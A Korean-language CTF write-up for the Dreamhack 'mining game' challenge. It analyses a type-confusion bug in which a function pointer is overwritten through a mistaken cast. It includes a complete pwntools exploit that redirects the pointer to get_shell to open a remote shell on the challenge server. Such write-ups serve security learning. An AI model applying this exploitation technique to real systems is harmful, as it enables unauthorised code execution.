Dreamhack mining game
==========================


<img width="367" height="682" alt="image" src="https://github.com/user-attachments/assets/4cf72b60-d37c-4bc4-89b4-a87d1136f991" />

<img width="767" height="643" alt="image" src="https://github.com/user-attachments/assets/e626158d-9bf2-4f2f-8155-c9001061cf98" />

<img width="1172" height="707" alt="image" src="https://github.com/user-attachments/assets/d2285aa1-ba0c-4f33-a347-6d90cf8d4f69" />

<img width="500" height="542" alt="image" src="https://github.com/user-attachments/assets/7f0c5892-85c1-41f6-a080-d29d519f2831" />

<img width="630" height="503" alt="image" src="https://github.com/user-attachments/assets/3d268f16-fdd5-41a5-841e-08dff67af988" />

<img width="431" height="352" alt="image" src="https://github.com/user-attachments/assets/b0433a11-0bc9-4498-a1f5-59d48de00a09" />

<img width="1002" height="657" alt="image" src="https://github.com/user-attachments/assets/1f743bbf-a554-4e3a-8efc-fce78aba9096" />

<img width="726" height="598" alt="image" src="https://github.com/user-attachments/assets/abb7f7c4-c405-4d1a-a20b-dc24d47b9e47" />

<img width="642" height="676" alt="image" src="https://github.com/user-attachments/assets/69b0b429-ea4c-4caa-8d67-c50ff8fcf95f" />


코드가 좀 길지만 동작을 요약해보면 이렇게 정리할 수 있다.


* **초기화**
    * 프로그램 시작 시 `initialize` 함수가 실행되어 표준 입출력 버퍼를 비활성화하고 60초 타이머를 설정한다.
      이 타이머는 60초가 지나면 프로그램이 종료되도록 한다.
    * `get_shell()` 함수는 쉘을 얻는 함수이다.

* **메뉴 및 출력**
    * `print_banner()`, `print_menu()` 함수를 통해 사용자에게 시작 메시지와 메뉴를 보여준다.
    * 다양한 `print_xxx_description()` 함수들은 광물들의 정보를 출력한다.
      이 함수들은 `rare_earth_description_funcs` 벡터에 저장되어 있습니다.

* **유틸리티 함수**
    * `get_int()`: 사용자로부터 정수 입력을 받는다.
    * `get_string()`: 사용자로부터 문자열 입력을 받는다.
    * `get_rand_int()`: 지정된 범위 내에서 난수를 생성한다.

* **광물 클래스**
    * `Mineral` (추상 클래스): `print_description()`이라는 가상 함수를 가진 기본 광물 클래스이다.
    * `UndiscoveredMineral`: `Mineral`을 상속받아 "미발견 광물"을 나타낸다.
      사용자가 직접 설명을 입력할 수 있으며 설명은 `MAX_DESCRIPTION_SIZE` (16바이트)로 제한된다.
    * `RareEarth`: `Mineral`을 상속받아 "희토류 광물"을 나타낸다.
      미리 정의된 희토류 광물 설명 함수 중 하나를 사용하여 정보를 출력한다.

* **주요 동작 함수**
    * **`mining()` (채굴)**
        * 일정 시간 동안 채굴 시뮬레이션을 한다.
        * 50% 확률로 **미발견 광물**을 발견하고 사용자가 설명을 입력하게 한다.
        * 5% 확률로 **희토류 광물**을 발견하고 미리 정의된 희토류 중 하나를 무작위로 선택하여 정보를 보여준다.
        * 나머지 경우에는 아무것도 발견하지 못한다.
        * 발견된 광물은 `minerals` 벡터에 추가된다.
    * **`show_mineral_book()` (광물 도감 보기)**
        * 현재까지 발견된 모든 광물들의 목록과 자세한 정보를 인덱스와 함께 출력한다.
    * **`edit_mineral_book()` (광물 도감 수정)**
        * 사용자가 인덱스를 입력하여 기존에 발견한 "미발견 광물"의 설명을 수정할 수 있다.


* **`main()` 함수**
    * 프로그램의 메인 루프이다.
    * 배너를 출력하고 메뉴를 계속 표시하며 사용자의 입력을 기다린다.
    * 사용자의 입력에 따라 `mining`, `show_mineral_book`, `edit_mineral_book` 함수를 호출하거나 프로그램을 종료한다.
 


## 취약점 분석: edit_mineral_book() 함수에서 발생하는 Type Confusion

### 1. 프로그램에 나오는 두 클래스

```cpp
class UndiscoveredMineral : public Mineral {
    char description[16];  // 그냥 문자열
}

class RareEarth : public Mineral {
    DESC_FUNC description; // 함수 포인터 
}
```

둘 다 Mineral* 포인터로 vector<Mineral*> minerals에 저장돼서 공통 인터페이스로 관리됨.

---------------------


### 2. edit_mineral_book() 함수의 문제점

```cpp
void edit_mineral_book() {
    ...
    strncpy(
        static_cast<UndiscoveredMineral*>(minerals[index])->description,
        description.c_str(),
        MAX_DESCRIPTION_SIZE
    );
}
```

여기서 문제는
* 실제로 minerals[index]가 RareEarth*인데
* 무작정 UndiscoveredMineral*로 강제로 바꿔서 함수 포인터가 저장된 영역에 문자열을 덮어버림.

**구조체를 잘못 해석해서 함수 포인터에 내가 입력한 문자열이 들어가버리는 것이 핵심 취약점**

→ **그 결과 함수 포인터(RareEarth::description)를 원하는 주소로 임의로 조작 가능**



이를 이용하면


```cpp
void RareEarth::print_description() const {
    if (description)
        description();  // ← 공격자가 덮은 포인터를 호출
}
```

* print_description()이 호출될 때 description()이 실행됨
* 그런데 그 description은 함수 포인터였고 지금은 덮어쓴 주소임

→ **쉘 따기 가능 (get_shell() 주소로 덮어서)**




## 익스플로잇 시나리오

**1. mining()을 반복해서 rare-earth 광물을 하나 발견함**
* 이건 내부적으로 RareEarth* 객체로 저장됨

**2. 발견한 rare-earth의 인덱스를 기억함 (idx 변수)**

**3. 메뉴 3번 (edit_mineral_book)을 실행해서**
* 해당 인덱스를 지정
* description 입력을 get_shell() 주소로 덮어씀

**4. 이후 RareEarth::print_description()이 호출되면**
* 함수 포인터가 get_shell로 되어 있으므로 쉘이 뜸



## 익스플로잇 과정

일단 ida로 바이너리 열어서 get_shell 주소부터 구한다.

<img width="426" height="298" alt="image" src="https://github.com/user-attachments/assets/c37340a4-deb1-4b4f-a031-c6561c8e0dd6" />

"/bin/sh" 사용하는 함수로 역으로 추적하면 찾을 수 있다.

익스플로잇 코드를 작성한다.



```python
from pwn import *
import time

p = remote('host1.dreamhack.games', 13735)

getsh_addr = 0x402576
payload = p64(getsh_addr)
idx = 0

while True:
    print(idx)
    p.recvuntil(b'>> ')       
    p.sendline(b"1")        
    p.recvline()
    time.sleep(1.1)
    a = p.recvline()
    print('output :', a.decode())  

    if a == b"[+] Congratulations! you found an *undiscovered* mineral!\n" or a == b"[+] You found a rare-earth element!\n":
        if a == b"[+] Congratulations! you found an *undiscovered* mineral!\n":
            print('mineral')
            p.recvuntil(b"Please enter mineral's description : ")
            p.sendline(b"aaaa")
            idx += 1
        else:
            print('rare-earth')
            for _ in range(5):
                print(p.recvline().decode())
            p.recvuntil(b'>> ')
            p.sendline(b'3')
            p.recv(12)
            p.sendline(str(idx).encode())   
            p.recv(37)
            p.send(payload)
            p.interactive()
```

* rare-earth가 등장할 때까지 무한 루프를 돌며 mining을 반복
* 발견되면 바로 edit 메뉴로 진입해서 해당 인덱스를 덮어씀
* payload는 정확히 8바이트 (p64(getsh_addr))로 DESC_FUNC에 정확히 맞게 들어가야 함
* p.interactive()로 쉘을 유지

---------------------------------------

```python
getsh_addr = 0x402576  # get_shell 함수 주소
payload = p64(getsh_addr)  # 리틀엔디언으로 주소 인코딩

idx = 0  # 현재 광물의 인덱스 (vector<Mineral*>에 쌓이는 순서)
```

--------------------

### 반복적으로 mining 시도

```
while(1):
    print(idx)
    p.recvuntil('>> ')
    p.sendline("1")  # mining
    p.recvline()
    sleep(1.1)
    a = p.recvline()
    print('output : ' + a)
```
* mining() 호출 (1번 메뉴)
* a는 mining 결과 메시지.

--------------

### 발견된 광물에 따른 분기 처리

```python
if(a == "[+] Congratulations! you found an *undiscovered* mineral!\n"):
    print('mineral')
    p.recvuntil("Please enter mineral's description : ")
    p.sendline("aaaa")  # 그냥 dummy
    idx+=1
```

평범한 광물 발견 시: UndiscoveredMineral → idx 증가


```python
else:
    print('rare-earth')
    ...
    p.sendline('3')  # 메뉴 3: edit_mineral_book
    ...
    p.sendline(str(idx))  # 방금 얻은 rare-earth의 인덱스를 넘김
    ...
    p.send(payload)  # 함수 포인터 자리에 get_shell 주소 덮어쓰기
    p.interactive()  # 쉘 진입

```

* rare-earth 발견 시 → 바로 함수 포인터 덮기
* edit_mineral_book()을 통해 rare-earth 객체를 UndiscoveredMineral*로 캐스팅
* strncpy()로 함수 포인터에 get_shell() 주소를 덮어씌움

--------------

### 쉘 실행 트리거

```python
void print_description() const override 
{
    if ( description )
        description();  // 덮은 get_shell 주소 호출됨
}
```

덮은 후 RareEarth::print_description()이 실행되면, 내부적으로 description()이 호출되며 덮어쓴 함수 주소가 호출 

→ get_shell() 실행!



## 플래그 출력

<img width="437" height="178" alt="image" src="https://github.com/user-attachments/assets/d12fac32-d724-4d1a-ac18-68f0b88ca22b" />

프로그램 돌려놓고 rareearth 채굴때까지 대기 > 메뉴 뜨면 description 출력 위해서 2 누르면 쉘이 따지고 플래그 획득 가능하다.



  
